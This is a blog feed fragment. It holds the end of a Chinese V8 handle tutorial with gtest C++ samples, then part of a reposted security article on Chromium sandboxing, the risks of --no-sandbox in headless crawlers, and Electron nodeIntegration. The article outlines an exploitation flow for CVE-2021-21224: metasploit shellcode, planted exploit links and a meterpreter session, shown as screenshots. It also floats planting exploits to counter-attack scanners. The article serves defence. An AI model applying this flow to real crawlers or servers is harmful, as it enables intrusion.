class="hljs-built_in">ToString</span>();<br><br><span class="hljs-keyword">if</span>(!s.<span class="hljs-built_in">IsEmpty</span>())&#123;<br>    Local&lt;String&gt; _s = s.<span class="hljs-built_in">ToLocalChecked</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>样例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;gtest/gtest.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8_test_fixture.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;v8.h&quot;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> v8;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MaybeLocalTest</span> : <span class="hljs-keyword">public</span> V8TestFixture &#123;<br>&#125;;<br><br><span class="hljs-built_in">TEST_F</span>(MaybeLocalTest, Basic) &#123;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  MaybeLocal&lt;Value&gt; m;<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(m.<span class="hljs-built_in">IsEmpty</span>());<br>  <span class="hljs-built_in">ASSERT_DEATH</span>(m.<span class="hljs-built_in">ToLocalChecked</span>(), <span class="hljs-string">&quot;Fatal error&quot;</span>);<br><br>  <span class="hljs-comment">// the &#123;&#125; will use the types, MaybeLocal default constructor so this would</span><br>  <span class="hljs-comment">// be the same as writing MaybeLocal&lt;Value&gt; something = MaybeLocal&lt;Value&gt;();</span><br>  MaybeLocal&lt;Value&gt; something = &#123;&#125;;<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(something.<span class="hljs-built_in">IsEmpty</span>());<br>  MaybeLocal&lt;Value&gt; something2 = <span class="hljs-built_in">MaybeLocal</span>&lt;Value&gt;();<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(something<span class="hljs-number">2.</span><span class="hljs-built_in">IsEmpty</span>());<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(MaybeLocalTest, ToLocal) &#123;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  Local&lt;Number&gt; nr = Number::<span class="hljs-built_in">New</span>(isolate_, <span class="hljs-number">18</span>);<br>  MaybeLocal&lt;Number&gt; maybe_nr = <span class="hljs-built_in">MaybeLocal</span>&lt;Number&gt;(nr);<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(maybe_nr.<span class="hljs-built_in">IsEmpty</span>());<br><br>  Local&lt;Number&gt; nr2;<br>  <span class="hljs-comment">// The following pattern can be nice to use with if statements</span><br>  <span class="hljs-comment">// since ToLocal returns a bool if the MaybeLocal is empty.</span><br>  <span class="hljs-built_in">EXPECT_TRUE</span>(maybe_nr.<span class="hljs-built_in">ToLocal</span>&lt;Number&gt;(&amp;nr2));<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(maybe_nr.<span class="hljs-built_in">ToLocal</span>(&amp;nr2));<br>  <span class="hljs-built_in">EXPECT_EQ</span>(nr2-&gt;<span class="hljs-built_in">Value</span>(), <span class="hljs-number">18</span>);<br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(MaybeLocalTest, FromMaybe) &#123;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  Local&lt;String&gt; str = String::<span class="hljs-built_in">NewFromUtf8Literal</span>(isolate_, <span class="hljs-string">&quot;bajja&quot;</span>);<br>  MaybeLocal&lt;String&gt; maybe_str = <span class="hljs-built_in">MaybeLocal</span>&lt;String&gt;(str);<br>  Local&lt;Value&gt; from_local = maybe_str.<span class="hljs-built_in">FromMaybe</span>&lt;Value&gt;(<span class="hljs-built_in">Local</span>&lt;Value&gt;());<br>  <span class="hljs-built_in">EXPECT_FALSE</span>(from_local.<span class="hljs-built_in">IsEmpty</span>());<br>  <span class="hljs-function">String::Utf8Value <span class="hljs-title">value</span><span class="hljs-params">(isolate_, from_local)</span></span>;<br>  <span class="hljs-built_in">EXPECT_STREQ</span>(<span class="hljs-string">&quot;bajja&quot;</span>, *value);<br><br>  maybe_str = <span class="hljs-built_in">MaybeLocal</span>&lt;String&gt;();<br>  from_local = maybe_str.<span class="hljs-built_in">FromMaybe</span>&lt;Value&gt;(<span class="hljs-built_in">Local</span>&lt;Value&gt;());<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(from_local.<span class="hljs-built_in">IsEmpty</span>());<br>&#125;<br><br><span class="hljs-function">MaybeLocal&lt;Value&gt; <span class="hljs-title">something</span><span class="hljs-params">()</span> </span>&#123;<br>  MaybeLocal&lt;Object&gt; empty; <span class="hljs-comment">// call some function that returns</span><br>  Local&lt;Object&gt; obj;<br>  <span class="hljs-keyword">if</span> (!empty.<span class="hljs-built_in">ToLocal</span>(&amp;obj)) &#123;<br>    <span class="hljs-comment">// do some error handling</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> obj; <span class="hljs-comment">// just return the value or empty.</span><br>&#125;<br><br><span class="hljs-built_in">TEST_F</span>(MaybeLocalTest, ReturnEmpty) &#123;<br>  <span class="hljs-function">Isolate::Scope <span class="hljs-title">isolate_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  <span class="hljs-function"><span class="hljs-type">const</span> HandleScope <span class="hljs-title">handle_scope</span><span class="hljs-params">(isolate_)</span></span>;<br>  Handle&lt;Context&gt; context = Context::<span class="hljs-built_in">New</span>(isolate_);<br>  <span class="hljs-function">Context::Scope <span class="hljs-title">context_scope</span><span class="hljs-params">(context)</span></span>;<br><br>  MaybeLocal&lt;Value&gt; maybe = <span class="hljs-built_in">something</span>();<br>  <span class="hljs-built_in">EXPECT_TRUE</span>(maybe.<span class="hljs-built_in">IsEmpty</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="小结">小结</h1><p>本节介绍了ChromeV8的一些基础知识，包括它的内存机制是怎样的，以及它的几个基础数据类型。</p><p>内存管理机制浅述了以空间换时间的高效新生代内存回收算法Scavenge，以及效率与碎片内存管理并存的Mark-Sweep和Mark-Compact结合体机制下的老生代内存回收算法。同时也介绍了新生代与老生代内存的一个联系，在特定情况下，新生代内存里面的对象会晋升到老生代对象中。</p><p>句柄是用于获取JavaScript对象实体的一种事物，有有效句柄连接的对象实体不会被垃圾回收器进行回收，而失去了所有句柄引用的对象实体会被认为是垃圾，从而在下次垃圾回收的时候被释放。</p>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Chromium</tag>
      
      <tag>v8</tag>
      
      <tag>javascript</tag>
      
      <tag>Memory Management</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【转载】攻防启示：Chromium 组件风险剖析与收敛</title>
    <link href="/2021/07/15/Chromium-component-risk-analysis/"/>
    <url>/2021/07/15/Chromium-component-risk-analysis/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文由TSRC原创发布<br /><a href="https://mp.weixin.qq.com/s/f0aFLEKyABpYDobPN2b6tQ"class="uri">https://mp.weixin.qq.com/s/f0aFLEKyABpYDobPN2b6tQ</a></p></blockquote><h1 id="背景">背景</h1><p>数月前我们在攻防两个方向经历了一场 “真枪实弹”的考验，期间团队的目光曾一度聚焦到 Chromium 组件上。</p><p>其实，早在 Microsoft 2018 年宣布 Windows 的新浏览器 Microsoft Edge将基于 Chromium内核进行构建之前，伴随互联网发展至今的浏览器之争其实早就已经有了定论，Chromium已然成为现代浏览器的事实标准，市场占有率也一骑绝尘。在服务端、桌面还是移动端，甚至据传SpaceX 火箭亦搭载了基于 Chromium 开发的控制面板。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/1.png" /></p><p>Chromium内核的安全问题，早已悄无声息地牵动着互联网生活方方面面。基于对实战经历的复盘，本文将从Chromium架构及安全机制概况入手，剖析Chromium组件在多场景下给企业带来的安全风险并一探收敛方案。</p><h1 id="浅析chromium">浅析Chromium</h1><h2 id="chromium涉及哪些组件">Chromium涉及哪些组件？</h2><p>Chromium主要包含两大核心组成部分：渲染引擎和浏览器内核。</p><h3 id="渲染引擎">渲染引擎</h3><p>Chromium目前使用Blink作为渲染引擎，它是基于webkit定制而来的，核心逻辑位于项目仓库的third_party/blink/目录下。渲染引擎做的事情主要有：</p><ol type="1"><li><p>解析并构建DOM树。Blink引擎会把DOM树转化成C++表示的结构，以供V8操作。</p></li><li><p>调用V8引擎处理JavaScript和WebAssembly代码，并对HTML文档做特定操作。</p></li><li><p>处理HTML文档定义的CSS样式</p></li><li><p>调用ChromeCompositor，将HTML对应的元素绘制出来。这个阶段会调用OpenGL，未来还会支持Vulkan。在Windows平台上，该阶段还会调用DirectX库处理；在处理过程中，OpenGL还会调用到Skia，DirectX还会调用到ANGLE。</p></li></ol><p>Blink组件间的调用先后关系，可用下图概括：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/2.png" /></p><p>可以说，几乎所有发生在浏览器页签中的工作，都有Blink参与处理。由于涉及许多组件库，不难想象过程中可能会出现的安全风险一定不少。据《TheSecurity Architecture of the ChromiumBrowser》一文的统计数据，约67.4%的浏览器漏洞都出在渲染引擎中，这也是为什么要引入Sandbox这么重要。</p><h3 id="浏览器内核">浏览器内核</h3><p>浏览器内核扮演连接渲染引擎及系统的“中间人”角色，具有一定“特权”，负责处理的事务包括但不限于：</p><ol type="1"><li><p>管理收藏夹、cookies以及保存的密码等重要用户信息</p></li><li><p>负责处理网络通讯相关的事务</p></li><li><p>在渲染引擎和系统间起中间人的角色。渲染引擎通过Mojo与浏览器内核交互，包含组件：download、payments等等。</p></li></ol><h2 id="chromium-的沙箱保护原理机制">Chromium 的沙箱保护原理/机制</h2><h3 id="为什么要引入沙箱">为什么要引入沙箱？</h3><p>前述部分提到，Chromium 渲染引擎涉及大量 C++编写的组件，出现漏洞的概率不小。因此，基于纵深防御理念浏览器引入了涉及三层结构。</p><p>渲染引擎等组件不直接与系统交互，而是通过一个被称为 MOJO 的 IPC组件与浏览器引擎通讯（也被称为：broker），再与系统交互。进而可以实现：即便沙箱中的进程被攻破，但无法随意调用系统API 产生更大的危害。</p><p>有点类似：即便攻破了一个容器实例，在没有逃逸或提权漏洞的情况下，宿主机安全一定程度上不受影响（实际上，浏览器的Sandbox 和容器隔离的部分技术原理是相似的）。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/3.png" /></p><h3id="浏览器的哪些部分是运行在沙箱中的">浏览器的哪些部分是运行在沙箱中的？</h3><p>浏览器渲染引擎、GPU、PPAPI插件以及语音识别服务等进程是运行在沙箱中的。此外不同系统平台下的部分服务也会受沙箱保护，例如Windows 下打印时调用的 PDF 转换服务、icon 浏览服务；MacOS 下 NaClloader、需要访问 IOSurface 的镜像服务等。</p><p>更多细节可查阅 Chromium 项目文件 sandbox_type.h 和 sandbox_type.cc中的源码定义：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/4.png" /></p><h3id="windows和linux下沙箱实现的技术细节">Windows和Linux下沙箱实现的技术细节</h3><h4 id="windows">Windows</h4><p>在Windows平台上，Chrome组合使用了系统提供的RestrictedToken、Integrity Level、The Windows job object、The Windows desktopobject机制来实现沙盒。其中最重要的一点是，把写操作权限限制起来，这样攻击这就无法通过写入文件或注册表键来攻击系统。</p><h4 id="linux">Linux</h4><p>Chrome 在 Linux 系统上使用的沙箱技术主要涉及两层：</p><p><strong>第一层沙箱采用 setuid sandbox 方案。</strong></p><p>其主要功能封装在二进制文件 chrome_sandbox内，在编译项目时需要单独添加参数 “ninja -C xxx chrome chrome_sandbox”编译，可以通过设置环境变量 CHROME_DEVEL_SANDBOX 指定 Chrome 调用的setuid sandbox 二进制文件。</p><p>setuid sandbox主要依赖<strong>两项机制</strong>来构建沙盒环境：CLONE_NEWPID 和CLONE_NEWNET 方法。</p><p>CLONE_NEWPID 一方面会借助chroots，来限制相关进程对文件系统命名空间的访问；另一方面会在调用clone() 时指定 CLONE_NEWPID 选项，借助 PIDnamespace，让运行在沙盒中的进程无法调用 ptrace() 或 kill()操作沙盒外的进程。</p><p>而 CLONE_NEWNET则用于限制在沙盒内进程的网络请求访问，值得一提的是，使用该方法需要CAP_SYS_ADMIN 权限。</p><p>这也使得当 Chrome组件在容器内运行时，沙箱能力所需的权限会和容器所管理的权限有冲突；我们无法用最小的权限在容器里启动Chrome 沙箱，本文 4.2.2 部分会详细阐述此处的解决之道。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/5.png" /></p><blockquote><p>更多详参见 Linux Namespace 及 cgroups 介绍说明：<br />“Resource management: Linux kernel Namespaces and cgroups”<br /><ahref="https://sites.cs.ucsb.edu/~rich/class/cs293b-cloud/papers/lxc-namespace.pdf"class="uri">https://sites.cs.ucsb.edu/~rich/class/cs293b-cloud/papers/lxc-namespace.pdf</a></p></blockquote><p>由于 setuid sandbox 方案存在一定短板。自 Chrome 44 版本起已推荐namespaces sandbox 来替代 setuid sandbox 方案，其主要依赖于 Linux内核提供的 user namespaces 机制，相关逻辑可在项目的如下行代码看到：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/6.png" /></p><p><strong>第二层沙箱采用 Seccomp-BPF方案，用来限制进程访问内核特定攻击面。</strong></p><p>其原理是：通过将 Seccomp 和 BPF规则结合，实现基于用户配置的策略白名单，对系统调用及其参数进行过滤限制。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/7.png" /></p><blockquote><p><ahref="https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/linux/bpf_audio_policy_linux.cc;l=34;drc=8d990c92df3d03ff3d313428f25dd11b7e509bcf;bpv=1;bpt=1"class="uri">https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/linux/bpf_audio_policy_linux.cc;l=34;drc=8d990c92df3d03ff3d313428f25dd11b7e509bcf;bpv=1;bpt=1</a></p></blockquote><h2 id="小结">小结</h2><p>Chromium 涉及的组件众多，使用的 C++语言天然决定了会潜在不少安全问题。例如：一个 V8中的内存安全问题（如：CVE-2021-21220、CVE-2019–5782），组合 Web Assembly将 Shellcode 写入 RWXPages，在未受沙箱保护的情况下，就能实现远程代码执行。</p><p>沙箱机制组合使用了 OS 相关的隔离能力（如：Linux 平台上的namespace、Seccomp-BPF 机制），限制了被沙箱保护进程的资源访问以及syscall 能力，能很好的防止出现在渲染引擎中的漏洞，被用于直接实现 RCE：但沙箱机制也存在一些不足，历史上也出现过沙箱逃逸的漏洞，例如：GoogleProject Zero 团队曾发布的《Virtually Unlimited Memory: Escaping theChrome Sandbox》一文。</p><p>综上，在无法 100% 预防 Chromium渲染进程出现内存安全问题的情况下，开启沙箱保护是一项必须落地的最佳安全实践。</p><h1 id="chromium-漏洞攻击利用场景分析">Chromium漏洞攻击利用场景分析</h1><p>作为一款客户端组件，在评估 Chromium漏洞时，常常会聚焦于客户端的攻防场景。但根据我们的经验，受 chromium漏洞影响的不仅有客户端应用，也包含了服务器上运行的程序，例如：部署在服务器端、基于Chrome Headless 应用的爬虫程序等。</p><h2 id="服务器端">服务器端</h2><h3 id="禁用沙盒的-chromium-headless-应用">禁用沙盒的 chromium headless应用</h3><p>随着 Phantomjs 项目停止维护，Chromium headless 已经成为 HeadlessBrowser 的首选。在日常开发、测试、安全扫描、运维中，有许多地方会用到Headless Browser，包括不限于以下场景：</p><ul><li>前端测试</li><li>监控</li><li>网站截图</li><li>安全扫描器</li><li>爬虫</li></ul><p>在这些场景中，如果程序本身使用的 Chromium 存在漏洞，且访问的 URL可被外部控制，那么就可能受到攻击最终导致服务器被外部攻击者控制。</p><p>以常见的使用 Chrome headless 的爬虫为例，如果在一些网站测试投放包含exploit 的链接，有概率会被爬虫获取，相关爬取逻辑的通常做法是新建 tab导航至爬取到的链接。此时，如果爬虫依赖的 chromium应用程序更新不及时，且启动时设置了 –no-sandbox 参数，链接指向页面内的exploit 会成功执行，进而允许攻击者控制爬虫对应的服务器。</p><p>为何 –no-sandbox 会如此泛滥呢？我们不妨来看一下，当我们在 ROOT 下启动Chrome，会有什么样的提示呢？</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/8.png" /></p><p>我们会得到 <em>Running as root without –no-sandbox is notsupported</em> 的错误提示，且无法启动 Chrome；</p><p>这对于以研发效率和产品功能优先的研发同学来说无异于提示 “请使用?–no-sandbox 来启动 Chrome”, 应用容器化的进程也加剧了使用 ROOT用户启动应用程序的情况。</p><p>你不得不创建一个新的普通用户来启动 Chrome 服务，例如在 Dockerfile里加入 *<strong>RUN</strong>__useradd chrome* 和<em><strong>USER</strong> chrome</em> 语句；</p><p>有些基于 Chrome 的著名第三方库甚至会在代码中隐形植入关闭 sandbox的代码，当研发同学在 ROOT 下启动应用程序时，第三方库会默认关闭sandbox，添加 –no-sandbox 参数，例如 Golang 第三方 package Chromedp的代码：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/9.png" /></p><p>此时，对于开发同学来说使用 –no-sandbox参数甚至是无感的，直至自己的容器或服务器被攻击者入侵控制。</p><p>即使研发同学有启用 sandbox 来避免安全风险的意识，在容器化的应用内启动chrome 也是不易的；为镜像创建一个新的非 ROOT 用户并非唯一的条件，Chromesandbox 需要调用一些特定的 syscall 或 linux capabilities 权限用于启动sandbox 逻辑，同时容器镜像需要打入 chrome-sandbox二进制文件并写入环境变量以供 Chrome 进程找到 sandbox 程序。若未对 Chrome容器进行特定的权限配置，chrome 将输出 <em>Operation not permitted</em>报错信息并退出。</p><p>所以，网络上有大量的文档和博客推荐启用 –no-sandbox 来解决 Chromeheadless 的使用问题，这也间接助长了 –no-sandbox参数这种错误用法的泛滥：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/10.png" /></p><p>我们将在后面的章节里详细为您讲解 Chrome Sandbox在容器以及容器集群中方便快捷且安全合理的部署解决方案。</p><h3 id="浅议攻击方式">浅议攻击方式</h3><p>未知攻焉知防？虽然在已有 Exploit的情况下进行漏洞利用并不困难，但知悉漏洞利用的流程和攻击行为有助于我们更好的构建安全能力。</p><p>以下以最近的 CVE-2021-21224 漏洞为例，当服务端上程序使用的 chromium版本存在漏洞时，且未开启Sandbox，可以利用这个漏洞来获取服务器的权限。</p><p>首先攻击者使用 metasploit 生成 shellcode，这里假设 chromium 是在linux 上运行且架构为x64。同时，考虑到爬虫运行结束后往往会结束浏览器进程，通过设置PrependFork 为 true 可以保证 session 的持久运行。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/11.png" /></p><p>生成 shellcode 后监听端口：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/12.png" /></p><p>实战中，可以通过投递带 exploit的链接到各个网站上，这里假设攻击者控制的服务器正在被爬取或者正在被渗透测试人员的扫描器扫描：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/13.png" /></p><p>成功获取到爬虫 / 扫描器的服务器 session：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/14.png" /></p><p>meterpreter 的进程是 fork 后的 chrome 子进程：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/15.png" /></p><p>可以猜想，不仅是各种内嵌浏览器的客户端程序易受chromium相关漏洞影响，可能有相当多的服务端程序也暴露在chromium0Day/Nday的攻击下。chromium漏洞将会成为企业防御边界的新的突破口，而这个突破口是自内而外的，相比开放端口在外的服务漏洞，这种攻击可能会更隐蔽。</p><p>作为防御方，我们也可以利用chromium漏洞来反制一些攻击者，如果攻击者安全意识较差或者使用的工具安全性不强，防御方在服务器上托管带有exploit的网页，攻击者的爬虫/扫描器扫到了这些网页就可能被反制攻击。</p><h2 id="客户端">客户端</h2><p>在面对Chromium组件风险时，客户端场景往往首当其冲。通常，其风险成立条件有两点：1.使用了存在漏洞的Chromium组件；2.可以指定Webview组件访问特定的网站地址。</p><h3 id="移动客户端">移动客户端</h3><p>目前，移动客户端主要分两大“阵营”：安卓和iOS，最大相关风险是Webview类组件。前者Android System Webview是基于Chromium源代码开发的，所以当1Day披露时，需要及时跟进影响；iOSApp一般会使用WKWebView和JavaScriptCore，Chromium 1Day影响iOS应用的可能性较低。</p><p><strong>客户端内置 Webview 浏览器窗口</strong></p><p>除了使用系统自带的 Webview组件，另外一种比较常见且更容易引起注意的方式是使用应用内置或独立于系统之外的浏览器组件；此时，应用会选用Chromium体系的概率较高。应用选择自己内置并维护浏览器组件的原因有很多，例如以下几类需求：</p><ul><li>在浏览器内核层回收更多用于 Debug 的客户端信息；</li><li>支持如夜间模式、中文优化等用户需求；</li><li>支持更多的视频格式和文件格式；</li></ul><p>也有应用为了应对此前 App Store 在 WWDC 大会提出的限制（即 App Store中的所有应用都必须启用 App Transport Security 安全功能并全量走HTTPS），使用改过的 Webview 组件曲线救国，以便达到 App Store的合规需求。</p><p>也因为应用自己维护所使用的浏览器组件，当系统的 WebView跟随系统升级而修复漏洞时，应用所使用的的浏览器组件并不跟着更新；</p><p>作为应用开发者自己维护的硬分支，Chromium不断的功能变更和漏洞修复补丁都需要应用开发者自行合并和兼容；这不仅需要硬核的浏览器研发能力也需要日以继夜不断的坚持。</p><p>再加上，无论在移动端还是桌面客户端，在使用应用内 WebView时为了更加轻便和简洁，浏览器组件多是以单进程的方式启动；</p><p>而在我们之前对 Sandbox 技术的介绍中，浏览器 Sandbox 和单进程 WebView组件显然是冲突的；</p><p>这也使得历史上关闭 Sandbox能力的客户端程序，在漏洞修复过程中，对于开启 Sandbox的修复操作存在历史包袱。</p><p>无论如何，我们始终不建议移动端应用的 WebView组件可以由用户控制并打开开放性的页面；</p><p>这会使得应用内加载的内容可能存在不可控或不可信的内容。WebView组件可以打开的 URL，应该用白名单进行限制；特别是可以用 Deeplink打开并且存在 URL 参数的 WebView。</p><h3 id="桌面客户端">桌面客户端</h3><p>许多桌面客户端应用也是基于 Chromium 构建的。一类是基于 Chromium定制的浏览器产品、或内置基于 Chromium 开发 Webview组件的桌面客户端应用；另一类是基于 Electron 构建的桌面客户端应用。</p><p>前者与传统 Chrome 浏览器或是嵌入在移动客户端的 Webview组件类似，如果未开启沙箱保护，面临很大的风险。而后者 Electron 则是在评估Chromium 漏洞攻防利用场景时，比较容易被忽视的一块。Electron 基于Chromium 和 Node 构建，其主要特性之一就是能在渲染进程中运行Node.js。</p><p>目前有许多客户端工具基于它开发，涉及：VS Code、Typora、Slack等。默认情况下，渲染器进程未受沙箱保护，这是因为：大多数 Node.js 的 API都需要系统权限，没有文件系统权限的情况下 require()是不可用的，而该文件系统权限在沙箱环境下是不可用的，但功能性进程受沙箱保护。?</p><p>Electron除面临渲染引擎本身的安全风险外，主要风险源自于其本身的功能特性——nodeIntegration。当该选项被设置为true，表示 renderer 有权限访问 node.js API，进而执行 “特权”操作。这时如果攻击者能自由控制渲染的页面内容，则可直接实现 RCE。</p><h1 id="风险收敛方案">风险收敛方案</h1><p>回到我们今天的主题：<strong>修复和防御</strong>。</p><p>如上我们知道，Chromium的安全问题是方方面面的，各类安全风险也会在不同的场景上产生，那么如何收敛就是企业安全建设永恒的话题；最后我们想分享我们的安全实践经验，力求解答在安全实践中我们遇到的以下几个问题，如：</p><p>Chrome 组件的漏洞都有哪些？Google又是如何跟进它们的？我们又该如何评估和检测 Chrome 持续更新过程中所公开的1Day 风险？最终如何修复？Linux 容器中开启 Chrome沙盒的最佳实践又是什么？</p><h2 id="风险监测和评估">风险监测和评估</h2><h3 id="风险情报">风险情报</h3><p>有两个渠道可以及时了解到 Chromium 漏洞披露情况：</p><p><strong>1) Chromium 工单系统</strong></p><p>该平台上收录了所有已公开的 Chrome 安全Issue，可借助特定关键词检索。如检索已公开的高风险安全问题，可访问：</p><p><ahref="https://issues.chromium.org/issues?q=status:verified%20severity:s0%20type:vulnerability"class="uri">https://issues.chromium.org/issues?q=status:verified%20severity:s0%20type:vulnerability</a></p><p><strong>2) Chrome 发布日志</strong></p><p>Chrome 稳定版本发布消息会在 <ahref="https://chromereleases.googleblog.com/"class="uri">https://chromereleases.googleblog.com/</a>上发出，和稳定版本发布消息一起的还有该版本做了哪些安全更新以及对应漏洞的奖金。</p><p>事实上，甲方安全人员还可以借助一些技巧，提前了解安全问题的修复细节。</p><p>Gerrit 是基于 git 的一款 Code Review 平台，chrome team 使用该平台进行code review：<code>https://chromium-review.googlesource.com/</code>。该平台上的主题会关联对应的 issue id，通过对应修复 commit的主题可以了解到 issue 的修复方案和代码。</p><p>chromium 使用 <ahref="https://bugs.chromium.org/">https://bugs.chromium.org</a> 对chromium 的 bug 进行跟踪。可以用短链来访问对应的 issue，例如 issue1195777 可以用该链接访问：<a href="https://crbug.com/1195777。"class="uri">https://crbug.com/1195777。</a></p><p>chromium 安全问题对应关联的 issue在修复期间并且在补丁发布后也不一定是可见的，官方给出的披露原则是在补丁广泛应用后才会开放issue 的限制。但是 Gerrit 上对 issue 修复代码的 code review和关联信息是一直可见的，我们如果想了解某个 issue具体的修复代码和方案可以在 Gerrit 上找到。</p><p>以 issue 1195777 为例，在 Gerrit 使用 bug 搜索关键字可以搜到对应commit 的 code review 主题：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/16.png" /></p><p>而如果只有 CVE 编号，CVE 的 References 一般会给出 